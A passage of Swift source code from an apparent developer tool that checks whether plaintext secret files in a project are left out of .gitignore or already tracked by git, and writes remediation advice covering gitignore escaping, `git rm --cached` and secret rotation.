                        detail: withScope("Found \(count) in the part of \(project.rootPath) this scan reached (\(names.joined(separator: ", "))), and git ignores every one of those. The scan did not reach the whole project, so this app is not telling you that is all of them."))
                }
                return HealthFinding(
                    id: findingID, title: title, status: .ok,
                    detail: withScope("Found \(count) under \(project.rootPath) (\(names.joined(separator: ", "))). git ignores all of them, so none can be committed by accident."))
            }

            let exposedNames = exposed.map(relativeName).sorted()
            let trackedNames = exposed.filter { tracked.contains($0.path) }.map(relativeName).sorted()

            var detail = "These plaintext files under \(project.rootPath) are not gitignored: \(exposedNames.joined(separator: ", ")). Committing one publishes its contents to everyone with access to the repository's history, permanently."
            if !trackedNames.isEmpty {
                detail += "\n\nAlready tracked by git, so they are in the repository now: \(trackedNames.joined(separator: ", ")). Adding a .gitignore line does not remove a file that is already tracked."
            }

            let rotationNote = trackedNames.isEmpty
                ? " If one has already been committed, rotating the values is the only real fix — removing the file from a future commit does not remove it from history."
                : " For the files already tracked, rotating the values is the only real fix: they are in the history, and neither a .gitignore line nor a future deletion removes them from it. `git rm --cached <file>` stops tracking it going forward."

            var explanation = "Add these to .gitignore, one line per file — \(exposedNames.joined(separator: ", ")) — then move their secrets into a file this app encrypts."
            if exposedNames.contains(where: Self.nameNeedsGitignoreEscaping) {
                explanation += " One of those names contains a character .gitignore reads as pattern syntax (*, ?, [, ], !, # or \\), so it has to be escaped with a backslash in the line you add. `git check-ignore -v -- <file>` afterwards tells you whether the line actually took effect."
            }
            if exposedNames.contains(where: Self.nameSpansLines) {
                explanation += " \(Self.newlineInNameNote)"
            }
            explanation += rotationNote

            return HealthFinding(
                id: findingID, title: title, status: .problem,
                detail: withScope(detail),
                // No command. See this method's doc comment: a `.gitignore`
                // line needs pattern escaping as well as shell escaping, and a
                // string correct in both is one nobody can read before running.
                remediation: Remediation(explanation: explanation, command: nil))
        }
    }

    /// Characters `.gitignore` reads as syntax rather than as part of a name.
    /// A line built from such a name without backslash escaping matches
    /// something other than the file the user was told it covers — and a
    /// gitignore line that silently ignores nothing is precisely the failure
    /// this whole finding exists to catch.
    static func nameNeedsGitignoreEscaping(_ name: String) -> Bool {
        name.contains(where: { "*?[]!#\\".contains($0) })
            || name.hasPrefix(" ") || name.hasSuffix(" ")
    }

    /// Whether a filename contains a line break, and so cannot be named by
    /// any single-line command this app offers.
    ///
    /// `Character.isNewline`, not `$0 == "\n" || $0 == "\r"`: a CRLF pair is
    /// one `Character` equal to neither, so the explicit comparison missed
    /// exactly the name it needed to catch and the note about renaming the
    /// file first was never attached. Same fix, same reason, as
    /// `ShellQuoting.singleQuoted` — and the two must agree, because this
    /// predicate is what explains the `nil` that one returns.
    static func nameSpansLines(_ name: String) -> Bool {
        name.contains(where: \.isNewline)
    }

    static let newlineInNameNote =
        "One of these filenames contains a line break, which .gitignore cannot express and no single-line command can name safely, so this app is not offering one — rename the file first."
}
